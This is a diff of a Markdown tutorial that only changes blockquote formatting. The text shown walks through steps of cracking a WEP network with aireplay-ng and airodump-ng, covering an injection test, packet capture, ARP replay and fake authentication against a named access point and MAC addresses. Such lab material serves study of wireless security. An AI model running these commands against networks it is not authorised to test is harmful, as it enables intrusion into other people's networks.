@@ -95,13 +95,13 @@ We need lock the wireless card on the same channel as the AP with the following 
 The basic injection test provides additional valuable information as well
 
 > #aireplay-ng -9 -e LETHIHUYEN\* -a 72:F4:C2:D1:75:08 wlan0
-
+>
 >> -9 means injection test
-
+>>
 >> -e LETHIHUYEN\* teddy is the network name (SSID)
-
+>>
 >> -a 72:F4:C2:D1:75:08 is MAC address of the access point (BSSID)
-
+>>
 >> -wlan0 is the interface name
 
 ![injection test](image\injection-test.png)
@@ -109,11 +109,11 @@ The basic injection test provides additional valuable information as well
 Capture wireless packet:
 
 > #airodump-ng –bssid 72:F4:C2:D1:75:08 -c 1 -w WEPcrack wlan0
-
+>
 >> --bssid is MAC address of the access point
-
+>>
 >> -c 1 is AP channel
-
+>>
 >> -w WEPcrack: export to WEP crack file
 
 ![capture packet](image\capture-file-wepcrack.png)
@@ -121,19 +121,19 @@ Capture wireless packet:
 Generate traffic:
 
 > #aireplay-ng -3 -b 72:F4:C2:D1:75:08 -h E0:62:67:49:0D:74 wlan0
-
+>
 >> -3 means standard arp request replay
-
+>>
 >> -b 72:F4:C2:D1:75:08 is the access point MAC address
-
+>>
 >> -h E0:62:67:49:0D:74 is the source MAC address
 
 ![generate traffic](image\generate-traffic-1.png)
 
 > #aireplay-ng -1 0 -e LETHIHUYEN\* -a 72:F4:C2:D1:75:08 -h E0:62:67:49:0D:7A wlan0
-
+>
 >> -1 means fake authentication
-
+>>
 >> 0 reassociation timing in seconds
 
 ![generate traffic](image\generate-traffic-2.png)
